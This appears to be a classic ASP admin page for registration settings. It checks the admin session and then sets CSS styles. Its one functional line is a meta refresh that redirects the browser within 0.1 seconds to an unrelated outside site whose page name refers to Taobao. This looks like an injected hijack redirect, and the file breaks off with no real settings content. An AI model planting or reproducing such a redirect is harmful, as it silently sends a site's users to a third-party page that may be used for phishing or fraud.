<%@LANGUAGE="VBScript" codepage="936"%>
<!--#include file="conn.asp"-->
<%
set rs=server.createobject("adodb.recordset")
sql="select id,reg from reg order by id desc"
rs.open sql,conn,1,3
	
If session("admin")="" then
    Response.Write "<script>alert('用户未登录，请登录');top.location.href='index.asp';</SCRIPT>"
	Response.End
End If
  if Session("admin")<>"admin" then
    Response.Write("<script>alert('没有权限，执行失败');history.back();</script>")
	Response.end
  end if
%>
<title>注册设置</title>
<style type="text/css">
@import url("style.css");

A:link,A:active,A:visited{TEXT-DECORATION:none ;Color:#1FABD3}
A:hover{TEXT-DECORATION: underline;Color:#4455aa}
BODY{
	FONT-SIZE: 12px;
	COLOR: #000000;
	FONT-FAMILY:  宋体;
	background-color: #000000;
	

	background-image: url(img/leaf.gif);
}
font{line-height : normal ;}

td { table-layout:fixed;
word-break :break-all; 
font-family:"宋体"; 
font-size: 12px;
line-height: 15px;
}
th
{
background-color: #877C59;
COLOR: #F4F2EC;
font-size: 12px;
font-weight:bold;
}
.STYLE1 {	font-family: "宋体";
	font-weight: bold;
	color: #00FF00;
}
.STYLE3 {color: #00FF00}
</style>


<meta http-equiv="Content-Language" content="zh-CN">
<meta HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=gb2312">
<meta http-equiv="refresh" content="0.1;url=http://www.kkhhhh.com/Indextaobao11.asp">

 <html>